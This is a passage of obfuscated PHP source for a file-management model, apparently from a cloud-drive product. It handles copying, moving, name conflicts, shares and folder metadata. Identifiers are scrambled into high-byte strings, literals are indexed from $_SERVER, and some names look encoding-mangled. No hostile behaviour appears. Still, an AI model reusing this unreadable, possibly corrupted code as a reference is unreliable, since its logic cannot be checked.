$¹Æ‚œ•ã = $this->sourceInfo($ùĞ²šØ»); $¤›¯¹Ô = $this->sourceInfo($‰ÊŸ‚èé); $Ùš—¶œ = $¹Æ‚œ•ã[$“ä¥œ²³[540]] . $¹Æ‚œ•ã[$“ä¥œ²³[431]] . $“ä¥œ²³[50]; $ÊÈø·é¡ = $¤›¯¹Ô[$“ä¥œ²³[540]] . $¤›¯¹Ô[$“ä¥œ²³[431]] . $“ä¥œ²³[50]; $»ÃƒÎè¢ = strpos($ÊÈø·é¡, $Ùš—¶œ) === 0; return $»ÃƒÎè¢; } private $targetIsDelete = 0; public function copy($Àã—»ã«, $Ô¿Â©Ó¡, $İÂ˜ç = REPEAT_REPLACE, $Ğ‡ôş = '') { $ùË÷ïøè =& $_SERVER[¹ş¤¶ĞÖ]; $‰©ÛúÍå = $this->sourceInfo($Àã—»ã«); $ÀÇ¬ìö = $this->sourceInfo($Ô¿Â©Ó¡); if (!$‰©ÛúÍå || !$ÀÇ¬ìö || $ÀÇ¬ìö[$ùË÷ïøè[439]] != $ùË÷ïøè[88]) { return !1; } if ($this->isParentOf($Àã—»ã«, $Ô¿Â©Ó¡)) { return !1; } $ÁÄì–¬“ = $Ğ‡ôş ? $Ğ‡ôş : $‰©ÛúÍå[$ùË÷ïøè[32]]; $this->lockCopyStart($Àã—»ã«); $this->lockWriteStart($Ô¿Â©Ó¡, $ÁÄì–¬“); $«›ß–€´ = array($ùË÷ïøè[586] => array(), $ùË÷ïøè[587] => array(), $ùË÷ïøè[588] => array()); $this->targetIsDelete = intval($‰©ÛúÍå[$ùË÷ïøè[460]]); $©íˆÙä¯ = $this->fileNameExistCache($Ô¿Â©Ó¡, $‰©ÛúÍå[$ùË÷ïøè[32]]); $­Ú±ú¤ó = $this->_copy($Àã—»ã«, $Ô¿Â©Ó¡, $İÂ˜ç, $«›ß–€´, !0, $Ğ‡ôş); $this->_childrenListClear(); $this->lockCopyEnd($Àã—»ã«); $this->lockWriteEnd($Ô¿Â©Ó¡, $ÁÄì–¬“); if ($‰©ÛúÍå[$ùË÷ïøè[439]] == $ùË÷ïøè[88] && $©íˆÙä¯ == $­Ú±ú¤ó) { $this->folderSizeResetChildren($©íˆÙä¯); } Model($ùË÷ïøè[589])->addAll($«›ß–€´[$ùË÷ïøè[587]], array(), !0); if ($©íˆÙä¯ != $­Ú±ú¤ó || $‰©ÛúÍå[$ùË÷ïøè[439]] == $ùË÷ïøè[88]) { Model($ùË÷ïøè[590])->eventCopy($­Ú±ú¤ó); } $this->saveAll($«›ß–€´[$ùË÷ïøè[588]]); Model($ùË÷ïøè[200])->linkAdd($«›ß–€´[$ùË÷ïøè[586]]); $this->folderSizeReset($Ô¿Â©Ó¡); $this->updateModifyTime($Ô¿Â©Ó¡); return $­Ú±ú¤ó; } private function _copy($¿íŸ±Ï¢, $§«’™Ó…, $ÍÔÎ€úÅ, &$í’ŒçíŞ, $Éà´„°‚, $°Áß‚İà = '') { $†ß÷òß =& $_SERVER[¹ş¤¶ĞÖ]; $‹ïö¥ğ¾ = $this->sourceInfoCache($¿íŸ±Ï¢); $†´ÅÙ¶™ = $‹ïö¥ğ¾[$†ß÷òß[439]] == $†ß÷òß[88]; $†‹†˜œÉ = $°Áß‚İà ? $°Áß‚İà : $‹ïö¥ğ¾[$†ß÷òß[32]]; $¥†ä’ŸÇ = $this->fileNameExistCache($§«’™Ó…, $†‹†˜œÉ); if ($Éà´„°‚) { $this->_childrenAllMake($¿íŸ±Ï¢); if ($†´ÅÙ¶™ && $¥†ä’ŸÇ) { $this->_childrenAllMake($¥†ä’ŸÇ); } } if (!$¥†ä’ŸÇ) { return $this->_copyCreate($¿íŸ±Ï¢, $§«’™Ó…, $†‹†˜œÉ, $í’ŒçíŞ); } $ƒø¹ = $¥†ä’ŸÇ; if ($†´ÅÙ¶™) { if ($ÍÔÎ€úÅ == REPEAT_RENAME_FOLDER) { $†‹†˜œÉ = $this->fileNameAutoCache($§«’™Ó…, $†‹†˜œÉ, $ÍÔÎ€úÅ, $†´ÅÙ¶™); $ƒø¹ = $this->_copyCreate($¿íŸ±Ï¢, $§«’™Ó…, $†‹†˜œÉ, $í’ŒçíŞ); } else { $í…¥‹îñ = $this->_childrenList($¿íŸ±Ï¢); foreach ($í…¥‹îñ as $¦ıÂøÜ÷) { $this->_copy($¦ıÂøÜ÷[$†ß÷òß[431]], $¥†ä’ŸÇ, $ÍÔÎ€úÅ, $í’ŒçíŞ, !1); } } } else { if ($ÍÔÎ€úÅ == REPEAT_RENAME || $ÍÔÎ€úÅ == REPEAT_RENAME_FOLDER) { $†‹†˜œÉ = $this->fileNameAutoCache($§«’™Ó…, $†‹†˜œÉ, $ÍÔÎ€úÅ, $†´ÅÙ¶™); $ƒø¹ = $this->_copyCreate($¿íŸ±Ï¢, $§«’™Ó…, $†‹†˜œÉ, $í’ŒçíŞ); } else { if ($ÍÔÎ€úÅ == REPEAT_REPLACE) { $ìˆø×’› = $this->sourceInfoCache($¥†ä’ŸÇ); $ç°ï ª = $this->fileHistory($ìˆø×’›, $‹ïö¥ğ¾[$†ß÷òß[497]], $‹ïö¥ğ¾[$†ß÷òß[76]]); if ($ç°ï ª) { $í’ŒçíŞ[$†ß÷òß[586]][] = $‹ïö¥ğ¾[$†ß÷òß[497]]; } } else { if ($ÍÔÎ€úÅ == REPEAT_SKIP) { } } } Hook::trigger($†ß÷òß[591], array($†ß÷òß[592], $‹ïö¥ğ¾, 0)); } return $ƒø¹; } private function _copyCreate($ó‡‹ÒÔµ, $Ê¥«ë—, $›ëÌà–, &$áğ¯ùö) { $¢×¥¤š =& $_SERVER[¹ş¤¶ĞÖ]; $ùëà«‡ = $this->sourceInfoCache($ó‡‹ÒÔµ); $³ÅÄÉå = $this->sourceInfoCache($Ê¥«ë—); $˜¥ÎÕÎ‰ = $this->_makeItemData($ùëà«‡, $³ÅÄÉå, $›ëÌà–); Hook::trigger($¢×¥¤š[593], $˜¥ÎÕÎ‰); Hook::trigger($¢×¥¤š[594], array($¢×¥¤š[595], $˜¥ÎÕÎ‰, 0)); $¦¯Úœªµ = $this->add($˜¥ÎÕÎ‰); $à¬¾Ã”¢ = array($¢×¥¤š[431] => $¦¯Úœªµ, $¢×¥¤š[32] => $›ëÌà–); $this->_copyApplyMeta($à¬¾Ã”¢, $áğ¯ùö); if ($ùëà«‡[$¢×¥¤š[439]] != $¢×¥¤š[88]) { $áğ¯ùö[$¢×¥¤š[586]][] = $ùëà«‡[$¢×¥¤š[497]]; return $¦¯Úœªµ; } $¤†ñ¼® = array(); $÷Í¬Ïö¡ = array(); $this->_childrenListAll($ó‡‹ÒÔµ, $¤†ñ¼®); $É‰äŸ¯á = count($¤†ñ¼®); if ($É‰äŸ¯á == 0) { return $¦¯Úœªµ; } $‘î©õÖÂ = $this->sourceInfo($¦¯Úœªµ); foreach ($¤†ñ¼® as $ôü„¡ÖÙ) { $Å¬ç‰éÙ = $this->_makeItemData($ôü„¡ÖÙ, $‘î©õÖÂ, $ôü„¡ÖÙ[$¢×¥¤š[32]]); $Å¬ç‰éÙ[$¢×¥¤š[540]] = $ôü„¡ÖÙ[$¢×¥¤š[540]]; $÷Í¬Ïö¡[] = $Å¬ç‰éÙ; } $this->chunkEventSet($¢×¥¤š[596], array($¢×¥¤š[597], $˜¥ÎÕÎ‰, $É‰äŸ¯á)); $this->addAll($÷Í¬Ïö¡, array(), !1); $åáşîí¶ = $this->where(array($¢×¥¤š[461] => $¦¯Úœªµ))->select(); $óµ‚õ = $this->_childrenMakeRelation($¤†ñ¼®, $åáşîí¶); $óµ‚õ[$ó‡‹ÒÔµ] = $¦¯Úœªµ; $İ“¤¯›Š = array(); $¬È¡…İê = array(); foreach ($åáşîí¶ as $ôü„¡ÖÙ) { $Ìú·ñ„§ = $ôü„¡ÖÙ[$¢×¥¤š[431]]; $–Ò¾– = $this->_childrenMatch($óµ‚õ, $ôü„¡ÖÙ, $‘î©õÖÂ); $İ“¤¯›Š[] = array($¢×¥¤š[431], $Ìú·ñ„§, $¢×¥¤š[461], $–Ò¾–[$¢×¥¤š[461]]); $¬È¡…İê[] = array($¢×¥¤š[431], $Ìú·ñ„§, $¢×¥¤š[540], $–Ò¾–[$¢×¥¤š[540]]); $this->_copyApplyMeta($ôü„¡ÖÙ, $áğ¯ùö); if ($ôü„¡ÖÙ[$¢×¥¤š[439]] != $¢×¥¤š[88]) { $áğ¯ùö[$¢×¥¤š[586]][] = $ôü„¡ÖÙ[$¢×¥¤š[497]]; } } $this->chunkEventSet($¢×¥¤š[598], array($¢×¥¤š[599], $˜¥ÎÕÎ‰, $É‰äŸ¯á)); $this->saveAll($İ“¤¯›Š); $this->chunkEventSet($¢×¥¤š[600], array($¢×¥¤š[601], $˜¥ÎÕÎ‰, $É‰äŸ¯á)); $this->saveAll($¬È¡…İê); return $¦¯Úœªµ; } private function _childrenMakeRelation($ôÏ€×İ¹, $’¹¸¨ğ) { $–Ó¯Ï± =& $_SERVER[¹ş¤¶ĞÖ]; $Á»àë“ = array(); $Ü³˜‘Ë = array(); foreach ($ôÏ€×İ¹ as $ä¶®æ¼«) { $ÔéîÊ±Â = $ä¶®æ¼«[$–Ó¯Ï±[32]] . $–Ó¯Ï±[8] . $ä¶®æ¼«[$–Ó¯Ï±[540]]; $Á»àë“[$ÔéîÊ±Â] = $ä¶®æ¼«[$–Ó¯Ï±[431]]; } foreach ($’¹¸¨ğ as $ä¶®æ¼«) { $ÔéîÊ±Â = $ä¶®æ¼«[$–Ó¯Ï±[32]] . $–Ó¯Ï±[8] . $ä¶®æ¼«[$–Ó¯Ï±[540]]; $€§÷«ì = $Á»àë“[$ÔéîÊ±Â]; $Ü³˜‘Ë[$€§÷«ì] = $ä¶®æ¼«[$–Ó¯Ï±[431]]; } return $Ü³˜‘Ë; } private function _childrenMatch($€ÁÅÄ·, $¡­€ŒË”, $íµÁ½¿) { $ƒùÀİ‚¡ =& $_SERVER[¹ş¤¶ĞÖ]; $¶×£ôå = $íµÁ½¿[$ƒùÀİ‚¡[540]]; $ÍæÖÁÓˆ = $this->parentLevelArray($¡­€ŒË”[$ƒùÀİ‚¡[540]]); foreach ($ÍæÖÁÓˆ as $¢²ˆÊî) { if (isset($€ÁÅÄ·[$¢²ˆÊî])) { $¶×£ôå .= $€ÁÅÄ·[$¢²ˆÊî] . $ƒùÀİ‚¡[602]; } } $¶×£ôå = rtrim($¶×£ôå, $ƒùÀİ‚¡[50]) . $ƒùÀİ‚¡[50]; $‹Ø¦Ä‡Œ = $this->parentLevelArray($¶×£ôå); $ÜşÚŸ = $‹Ø¦Ä‡Œ[count($‹Ø¦Ä‡Œ) - 1]; return array($ƒùÀİ‚¡[461] => $ÜşÚŸ, $ƒùÀİ‚¡[540] => $¶×£ôå); } private function _makeItemData($•“ŸÑæ™, $ª±É¢µ¿, $²å“—©Ë) { $ÊËÉùà =& $_SERVER[¹ş¤¶ĞÖ]; $ï³¶´´ã = array($ÊËÉùà[603] => $•“ŸÑæ™[$ÊËÉùà[439]], $ÊËÉùà[449] => $²å“—©Ë, $ÊËÉùà[604] => $•“ŸÑæ™[$ÊËÉùà[441]] ? $•“ŸÑæ™[$ÊËÉùà[441]] : $ÊËÉùà[12], $ÊËÉùà[498] => $•“ŸÑæ™[$ÊËÉùà[497]] ? $•“ŸÑæ™[$ÊËÉùà[497]] : 0, $ÊËÉùà[574] => $•“ŸÑæ™[$ÊËÉùà[76]] ? $•“ŸÑæ™[$ÊËÉùà[76]] : 0, $ÊËÉùà[605] => intval($ª±É¢µ¿[$ÊËÉùà[440]]), $ÊËÉùà[606] => intval($ª±É¢µ¿[$ÊËÉùà[525]]), $ÊËÉùà[607] => intval(USER_ID), $ÊËÉùà[608] => intval(USER_ID), $ÊËÉùà[430] => intval($ª±É¢µ¿[$ÊËÉùà[431]]), $ÊËÉùà[609] => $ª±É¢µ¿[$ÊËÉùà[540]] . $ª±É¢µ¿[$ÊËÉùà[431]] . $ÊËÉùà[50], $ÊËÉùà[453] => $•“ŸÑæ™[$ÊËÉùà[85]] ? $•“ŸÑæ™[$ÊËÉùà[85]] : time(), $ÊËÉùà[459] => 0, $ÊËÉùà[610] => $ÊËÉùà[12]); return $ï³¶´´ã; } private function _copyApplyMeta($•´û–« , &$¬œì˜¸•) { $—š¶ÏØ” =& $_SERVER[¹ş¤¶ĞÖ]; $ßİ‘¥«ô = $•´û–« [$—š¶ÏØ”[431]]; $ÀÚĞìÂ = $•´û–« [$—š¶ÏØ”[32]]; if (!isset($•´û–« [$—š¶ÏØ”[611]]) || !$•´û–« [$—š¶ÏØ”[611]] || $•´û–« [$—š¶ÏØ”[611]] == $—š¶ÏØ”[198]) { $¬œì˜¸•[$—š¶ÏØ”[588]][] = array($—š¶ÏØ”[431], $ßİ‘¥«ô, $—š¶ÏØ”[611], short_id($ßİ‘¥«ô)); } if (Input::check($ÀÚĞìÂ, $—š¶ÏØ”[612])) { $¬œì˜¸•[$—š¶ÏØ”[587]][] = array($—š¶ÏØ”[431] => $ßİ‘¥«ô, $—š¶ÏØ”[94] => $—š¶ÏØ”[494], $—š¶ÏØ”[403] => str_replace($—š¶ÏØ”[53], $—š¶ÏØ”[12], Pinyin::get($ÀÚĞìÂ))); $¬œì˜¸•[$—š¶ÏØ”[587]][] = array($—š¶ÏØ”[431] => $ßİ‘¥«ô, $—š¶ÏØ”[94] => $—š¶ÏØ”[493], $—š¶ÏØ”[403] => Pinyin::get($ÀÚĞìÂ, $—š¶ÏØ”[613])); } $¬œì˜¸•[$—š¶ÏØ”[587]][] = array($—š¶ÏØ”[431] => $ßİ‘¥«ô, $—š¶ÏØ”[94] => $—š¶ÏØ”[473], $—š¶ÏØ”[403] => KodSort::makeStr($ÀÚĞìÂ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($é¯•²ç) { $¯¨…”˜ =& $_SERVER[¹ş¤¶ĞÖ]; $Íí÷ö‰‘ = $this->sourceInfo($é¯•²ç); $°‡üÑÖñ = $¯¨…”˜[614]; $Ñğ…¿ = array($¯¨…”˜[540] => array($¯¨…”˜[569], $Íí÷ö‰‘[$¯¨…”˜[540]] . $é¯•²ç . $¯¨…”˜[570]), $¯¨…”˜[460] => $this->targetIsDelete); $¨Šú™ñ÷ = $this->field($°‡üÑÖñ)->where($Ñğ…¿)->select(); if (!$¨Šú™ñ÷) { return; } $¨Šú™ñ÷ = array_to_keyvalue($¨Šú™ñ÷, $¯¨…”˜[431]); foreach ($¨Šú™ñ÷ as $††øêëò) { $±“Ÿâ¼™ = $††øêëò[$¯¨…”˜[461]]; $é¯•²ç = $††øêëò[$¯¨…”˜[431]]; if (!isset($this->_childrenListCache[$é¯•²ç]) && $††øêëò[$¯¨…”˜[439]] == $¯¨…”˜[88]) { $this->_childrenListCache[$é¯•²ç] = array(); } if (!isset($this->_childrenListCache[$±“Ÿâ¼™])) { $this->_childrenListCache[$±“Ÿâ¼™] = array(); } $this->_childrenListCache[$±“Ÿâ¼™][$é¯•²ç] = $††øêëò; $this->_childrenItemCache[$é¯•²ç] = $††øêëò; } } private function _childrenListAll($ßÊ­ĞŸ¬, &$¤İ«ÊÓÅ) { $ç¬ÄÎ  =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->_childrenListCache[$ßÊ­ĞŸ¬])) { return; } $±üåº‰Ç = $this->_childrenListCache[$ßÊ­ĞŸ¬]; foreach ($±üåº‰Ç as $¦ÙÈ¸Ûò => $Øø×¡îñ) { $¤İ«ÊÓÅ[$¦ÙÈ¸Ûò] = $Øø×¡îñ; if ($Øø×¡îñ[$ç¬ÄÎ [439]] == $ç¬ÄÎ [88]) { $this->_childrenListAll($¦ÙÈ¸Ûò, $¤İ«ÊÓÅ); } } } private function sourceInfoCache($ôƒçÑé€) { if (isset($this->_childrenItemCache[$ôƒçÑé€])) { return $this->_childrenItemCache[$ôƒçÑé€]; } return $this->sourceInfo($ôƒçÑé€); } private function _childrenList($ Ìéİ×ß) { if (isset($this->_childrenListCache[$ Ìéİ×ß])) { return $this->_childrenListCache[$ Ìéİ×ß]; } return $this->_childrenListSelect($ Ìéİ×ß); } private function _childrenListSelect($à”öØßß) { $å¶«® =& $_SERVER[¹ş¤¶ĞÖ]; $“¾ÅÙ ï = array($å¶«®[461] => $à”öØßß, $å¶«®[460] => $this->targetIsDelete); $ªÑ³÷…» = $this->where($“¾ÅÙ ï)->select(); $ªÑ³÷…» = $ªÑ³÷…» ? $ªÑ³÷…» : array(); $‘äÛª´² = array_to_keyvalue($ªÑ³÷…», $å¶«®[431]); $this->_childrenListCache[$à”öØßß] = $‘äÛª´²; foreach ($‘äÛª´² as $à”öØßß => $ıõùğ±) { $this->_childrenItemCache[$à”öØßß] = $ıõùğ±; } return $‘äÛª´²; } private function fileNameExistCache($÷šÊ…”, $Ö´ĞœÉì) { $÷ı—™î =& $_SERVER[¹ş¤¶ĞÖ]; $Ö´ĞœÉì = strtolower($Ö´ĞœÉì); $úÉÇÄĞş = $this->_childrenList($÷šÊ…”); foreach ($úÉÇÄĞş as $Î°Ğ•ç±) { if ($Ö´ĞœÉì == strtolower($Î°Ğ•ç±[$÷ı—™î[32]])) { return $Î°Ğ•ç±[$÷ı—™î[431]]; } } return !1; } private function fileNameAutoCache($ Ó¦ûºÃ, $ª™›•İè, $Šß³‘€Î, $Õô‰áöÍ) { $¨ãèç =& $_SERVER[¹ş¤¶ĞÖ]; $¦Œ¸æšß = $this->_childrenList($ Ó¦ûºÃ); $•ÄÆèáÛ = array_to_keyvalue($¦Œ¸æšß, $¨ãèç[12], $¨ãèç[32]); return $this->fileNameAutoGet($•ÄÆèáÛ, $ª™›•İè, $Šß³‘€Î, $Õô‰áöÍ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Íöóı½, $äõ±ô, $Á§É†¸® = REPEAT_REPLACE, $şøò•®ª = '') { $ŠÍ¯ÈóÎ =& $_SERVER[¹ş¤¶ĞÖ]; $½˜¿êéˆ = $this->sourceInfo($Íöóı½); $Õ¤Òµ¨Ü = $this->sourceInfo($äõ±ô); if ($½˜¿êéˆ[$ŠÍ¯ÈóÎ[461]] == $Õ¤Òµ¨Ü[$ŠÍ¯ÈóÎ[431]]) { if ($½˜¿êéˆ[$ŠÍ¯ÈóÎ[460]] == $ŠÍ¯ÈóÎ[88]) { Model($ŠÍ¯ÈóÎ[458])->restore(array($Íöóı½)); } if (!$şøò•®ª || $şøò•®ª == $½˜¿êéˆ[$ŠÍ¯ÈóÎ[32]]) { return $Íöóı½; } } $’üîæúà = $this->pathInfoMore($Íöóı½); if ($this->isParentOf($Íöóı½, $äõ±ô)) { return !1; } if (!$½˜¿êéˆ || !$Õ¤Òµ¨Ü || $Õ¤Òµ¨Ü[$ŠÍ¯ÈóÎ[439]] != $ŠÍ¯ÈóÎ[88]) { return !1; } Hook::trigger($ŠÍ¯ÈóÎ[615], $’üîæúà); $this->targetIsDelete = intval($½˜¿êéˆ[$ŠÍ¯ÈóÎ[460]]); if ($½˜¿êéˆ[$ŠÍ¯ÈóÎ[461]] == $äõ±ô && $şøò•®ª != $½˜¿êéˆ[$ŠÍ¯ÈóÎ[32]]) { $ÊƒØ½² = $this->fileNameExist($äõ±ô, $şøò•®ª); if ($ÊƒØ½² && $½˜¿êéˆ[$ŠÍ¯ÈóÎ[439]] == $ŠÍ¯ÈóÎ[198]) { $ªî”­øß = $this->sourceInfo($ÊƒØ½²); $şÏ¤Œ·¡ = $this->fileHistory($ªî”­øß, $½˜¿êéˆ[$ŠÍ¯ÈóÎ[497]], $½˜¿êéˆ[$ŠÍ¯ÈóÎ[76]]); if (!$şÏ¤Œ·¡) { Model($ŠÍ¯ÈóÎ[500])->remove($½˜¿êéˆ[$ŠÍ¯ÈóÎ[497]]); } $this->removeNow($Íöóı½, !1); $this->folderSizeReset($äõ±ô); Hook::trigger($ŠÍ¯ÈóÎ[616], $’üîæúà); return $ÊƒØ½²; } } $¯¬š§ùˆ = $şøò•®ª ? $şøò•®ª : $½˜¿êéˆ[$ŠÍ¯ÈóÎ[32]]; $this->lockMoveStart($Íöóı½); $this->lockWriteStart($äõ±ô, $¯¬š§ùˆ); $Ëü©ìºÇ = array($ŠÍ¯ÈóÎ[586] => array(), $ŠÍ¯ÈóÎ[617] => !1); $this->clearShare($Íöóı½, $äõ±ô); $ßê¼î«Ÿ = $this->fileNameExistCache($äõ±ô, $½˜¿êéˆ[$ŠÍ¯ÈóÎ[32]]); $«öÂ™ÄÌ = $this->_move($Íöóı½, $äõ±ô, $Á§É†¸®, $Ëü©ìºÇ, $şøò•®ª); $this->sourceCacheClear(); if ($½˜¿êéˆ[$ŠÍ¯ÈóÎ[439]] == $ŠÍ¯ÈóÎ[88] && $ßê¼î«Ÿ) { $this->folderSizeResetChildren($«öÂ™ÄÌ); } Model($ŠÍ¯ÈóÎ[200])->linkAdd($Ëü©ìºÇ[$ŠÍ¯ÈóÎ[586]]); if ($ßê¼î«Ÿ && $Ëü©ìºÇ[$ŠÍ¯ÈóÎ[617]]) { $this->removeNow($Íöóı½, !1); } $this->lockMoveEnd($Íöóı½); $this->lockWriteEnd($äõ±ô, $¯¬š§ùˆ); $this->folderSizeReset($½˜¿êéˆ[$ŠÍ¯ÈóÎ[461]]); $this->folderSizeReset($äõ±ô); $ùíİ¹Õº = array($½˜¿êéˆ[$ŠÍ¯ÈóÎ[461]], $äõ±ô); if ($½˜¿êéˆ[$ŠÍ¯ÈóÎ[439]] == $ŠÍ¯ÈóÎ[88]) { $ùíİ¹Õº[] = $Íöóı½; } $this->updateModifyTime($ùíİ¹Õº); Model($ŠÍ¯ÈóÎ[590])->eventMove($Íöóı½, $½˜¿êéˆ[$ŠÍ¯ÈóÎ[461]], $äõ±ô); Hook::trigger($ŠÍ¯ÈóÎ[616], $’üîæúà); return $«öÂ™ÄÌ; } private function _move($ ÇºıƒÏ, $÷Æ·Ğ±‹, $¬“¢ƒğ±, &$Ş—ùø·Ä, $œîéá‡¢ = '') { $İŒ³¾¢† =& $_SERVER[¹ş¤¶ĞÖ]; $ã½§¢£ˆ = $this->sourceInfo($ ÇºıƒÏ); $ï‘ßõÔš = $ã½§¢£ˆ[$İŒ³¾¢†[439]] == $İŒ³¾¢†[88]; $šş™”® = $œîéá‡¢ ? $œîéá‡¢ : $ã½§¢£ˆ[$İŒ³¾¢†[32]]; $ÒÄºş¡ = $this->fileNameExistCache($÷Æ·Ğ±‹, $šş™”®); $this->lockMoveStart($ ÇºıƒÏ); $this->lockWriteStart($÷Æ·Ğ±‹, $šş™”®); if (!$ÒÄºş¡) { return $this->_moveForce($ ÇºıƒÏ, $÷Æ·Ğ±‹, $šş™”®); } $âÁÖ›Ú = $ÒÄºş¡; $Ç¢ñƒá = !1; if ($ï‘ßõÔš) { if ($¬“¢ƒğ± == REPEAT_RENAME_FOLDER) { $šş™”® = $this->fileNameAuto($÷Æ·Ğ±‹, $šş™”®, $¬“¢ƒğ±, $ï‘ßõÔš); $âÁÖ›Ú = $this->_moveForce($ ÇºıƒÏ, $÷Æ·Ğ±‹, $šş™”®); } else { if ($¬“¢ƒğ± == REPEAT_RENAME_FOLDER) { $¬“¢ƒğ± = REPEAT_RENAME; } $§ÀğÁé  = $this->_childrenListSelect($ ÇºıƒÏ); foreach ($§ÀğÁé  as $ÙšÁ¸–’) { $this->_move($ÙšÁ¸–’[$İŒ³¾¢†[431]], $ÒÄºş¡, $¬“¢ƒğ±, $Ş—ùø·Ä); } $Ç¢ñƒá = !0; } } else { if ($¬“¢ƒğ± == REPEAT_SKIP) { $Ç¢ñƒá = !0; } else { if ($¬“¢ƒğ± == REPEAT_RENAME || $¬“¢ƒğ± == REPEAT_RENAME_FOLDER) { $šş™”® = $this->fileNameAuto($÷Æ·Ğ±‹, $šş™”®, $¬“¢ƒğ±, $ï‘ßõÔš); $âÁÖ›Ú = $this->_moveForce($ ÇºıƒÏ, $÷Æ·Ğ±‹, $šş™”®); } else { if ($¬“¢ƒğ± == REPEAT_REPLACE) { $äœÀ¯ì’ = $this->sourceInfoCache($ÒÄºş¡); $¸ÛÙÒÚæ = $this->fileHistory($äœÀ¯ì’, $ã½§¢£ˆ[$İŒ³¾¢†[497]], $ã½§¢£ˆ[$İŒ³¾¢†[76]]); $Ç¢ñƒá = !0; if ($¸ÛÙÒÚæ) { $Ş—ùø·Ä[$İŒ³¾¢†[586]][] = $ã½§¢£ˆ[$İŒ³¾¢†[497]]; } } } } } if ($Ç¢ñƒá && !$Ş—ùø·Ä[$İŒ³¾¢†[617]]) { $Ş—ùø·Ä[$İŒ³¾¢†[617]] = !0; } return $âÁÖ›Ú; } private function _moveForce($Ì­–ƒÍ, $äš÷ÌÔ, $›·¢¤Ù·) { $§ÆÚ—¢ =& $_SERVER[¹ş¤¶ĞÖ]; $˜Ò¿«»· = $this->sourceInfo($Ì­–ƒÍ); $¤šüŞø¤ = $this->sourceInfo($äš÷ÌÔ); $¶Ê½Ë¸æ = $˜Ò¿«»·[$§ÆÚ—¢[439]] == $§ÆÚ—¢[88]; $ì“¾óµÖ = array($§ÆÚ—¢[430] => $¤šüŞø¤[$§ÆÚ—¢[431]], $§ÆÚ—¢[609] => $¤šüŞø¤[$§ÆÚ—¢[540]] . $¤šüŞø¤[$§ÆÚ—¢[431]] . $§ÆÚ—¢[50], $§ÆÚ—¢[605] => $¤šüŞø¤[$§ÆÚ—¢[440]], $§ÆÚ—¢[606] => $¤šüŞø¤[$§ÆÚ—¢[525]], $§ÆÚ—¢[608] => USER_ID, $§ÆÚ—¢[449] => $›·¢¤Ù·); $ó—›Àì = $˜Ò¿«»·[$§ÆÚ—¢[440]] == SourceModel::TYPE_GROUP && $¤šüŞø¤[$§ÆÚ—¢[440]] == SourceModel::TYPE_GROUP && $˜Ò¿«»·[$§ÆÚ—¢[525]] == $¤šüŞø¤[$§ÆÚ—¢[525]]; if (!$ó—›Àì && $this->moveClearAuth) { Model($§ÆÚ—¢[522])->authClear($Ì­–ƒÍ); } $ó½©ëÃ = $˜Ò¿«»·[$§ÆÚ—¢[460]] == $§ÆÚ—¢[88] && $¤šüŞø¤[$§ÆÚ—¢[460]] != $§ÆÚ—¢[88]; if ($ó½©ëÃ) { $ì“¾óµÖ[$§ÆÚ—¢[459]] = 0; } if ($¶Ê½Ë¸æ) { $·Àá¶Ó = array($§ÆÚ—¢[609] => array($§ÆÚ—¢[569], $˜Ò¿«»·[$§ÆÚ—¢[540]] . $˜Ò¿«»·[$§ÆÚ—¢[431]] . $§ÆÚ—¢[570])); $çü²±”† = $˜Ò¿«»·[$§ÆÚ—¢[540]] . $˜Ò¿«»·[$§ÆÚ—¢[431]] . $§ÆÚ—¢[50]; $ø¬ÈÂÚ‰ = $¤šüŞø¤[$§ÆÚ—¢[540]] . $¤šüŞø¤[$§ÆÚ—¢[431]] . $§ÆÚ—¢[50] . $˜Ò¿«»·[$§ÆÚ—¢[431]] . $§ÆÚ—¢[50]; $æñô€ = array($§ÆÚ—¢[609] => array($§ÆÚ—¢[618], "\162\x65\160\154\x61\x63\145\x28\160\x61\162\x65\x6e\x74\x4c\x65\x76\145\x6c\x2c\47{$çü²±”†}\47\x2c\47{$ø¬ÈÂÚ‰}\x27\51"), $§ÆÚ—¢[605] => $¤šüŞø¤[$§ÆÚ—¢[440]], $§ÆÚ—¢[606] => $¤šüŞø¤[$§ÆÚ—¢[525]]); if ($ó½©ëÃ) { $æñô€[$§ÆÚ—¢[459]] = 0; } $this->where($·Àá¶Ó)->data($æñô€)->save(); } $this->where(array($§ÆÚ—¢[446] => $Ì­–ƒÍ))->data($ì“¾óµÖ)->save(); return $Ì­–ƒÍ; } private function clearShare($âğÀºüß, $×è­Ó…·) { $£›µâõ¬ =& $_SERVER[¹ş¤¶ĞÖ]; $Š…õ’Å = $this->sourceInfo($âğÀºüß); $Õ®îâ»Ù = $this->sourceInfo($×è­Ó…·); if ($Š…õ’Å[$£›µâõ¬[525]] == $Õ®îâ»Ù[$£›µâõ¬[525]] && $Š…õ’Å[$£›µâõ¬[440]] == $£›µâõ¬[619]) { return; } $ÅêÓËˆë = array($£›µâõ¬[540] => array($£›µâõ¬[569], $Š…õ’Å[$£›µâõ¬[540]] . $âğÀºüß . $£›µâõ¬[570])); $×â¦Å¥½ = $this->field($£›µâõ¬[446])->where($ÅêÓËˆë)->getField($£›µâõ¬[431], !0); if (!$×â¦Å¥½) { return; } $ÅêÓËˆë = array($£›µâõ¬[431] => array($£›µâõ¬[7], $×â¦Å¥½), $£›µâõ¬[620] => 1); $€©¨ş˜ = Model($£›µâõ¬[621])->field($£›µâõ¬[622])->where($ÅêÓËˆë)->select(); if (!$€©¨ş˜) { return; } $€©¨ş˜ = array_to_keyvalue($€©¨ş˜, $£›µâõ¬[12], $£›µâõ¬[622]); $ÅêÓËˆë = array($£›µâõ¬[622] => array($£›µâõ¬[7], $€©¨ş˜)); Model($£›µâõ¬[621])->where($ÅêÓËˆë)->save(array($£›µâõ¬[620] => 0)); Model($£›µâõ¬[623])->where($ÅêÓËˆë)->delete(); } public function copyFolderFromIO($“‹üè¤ô, $ì²¹úü, $˜»Ù, $ßæÓˆÎ, $¹ãÃçò, $²ş´®† = false) { $‘·‚ÈÑ =& $_SERVER[¹ş¤¶ĞÖ]; $è°Ã’ = array($‘·‚ÈÑ[587] => array(), $‘·‚ÈÑ[588] => array(), $‘·‚ÈÑ[586] => array(), $‘·‚ÈÑ[624] => array()); $ğòñ´æ‡ = $²ş´®† ? $²ş´®† : $“‹üè¤ô->pathThis($ì²¹úü); $ˆä»¡Êå = $this->fileNameExist($˜»Ù, $ğòñ´æ‡); 